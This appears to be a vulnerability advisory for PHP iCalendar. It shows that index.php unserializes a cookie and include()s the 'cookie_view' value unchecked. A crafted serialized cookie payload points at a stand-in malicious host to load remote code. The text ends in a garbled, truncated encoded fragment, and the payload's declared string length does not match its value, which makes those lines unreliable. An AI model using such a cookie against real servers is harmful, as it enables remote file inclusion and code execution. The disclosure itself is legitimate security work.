I. BACKGROUND

PHP iCalendar is a php calendar, more information is available at the
vendor site.

II. DESCRIPTION

PHP iCalendar is vulnerable to Cross Site Scripting cause of a wrong
input validation in index.php and will include an arbitrary file
ending with .php.

The vulnerable code is:

> config.inc.php

$printview_default = 'no';

> index.php

if (isset($_COOKIE['phpicalendar'])) {
 $phpicalendar = unserialize(stripslashes($_COOKIE['phpicalendar']));
 $default_view = $phpicalendar['cookie_view'];
}

if ($printview_default == 'yes') {
 $printview = $default_view;
 $default_view = "print.php";
} else {
 $default_view = "$default_view".".php";
}

include($default_view);

As you can see there is no input validation at all.

III. ANALYSIS

This vulnerability can be exploited using an hand-crafted cookie with
the right serialized array inside.

a:1:{s:11:"cookie_view";s:23:"http://www.mali.cious/script";}

ie_view%22%3Bs%3A34%3A%22http%3A%2F%2Fwww.
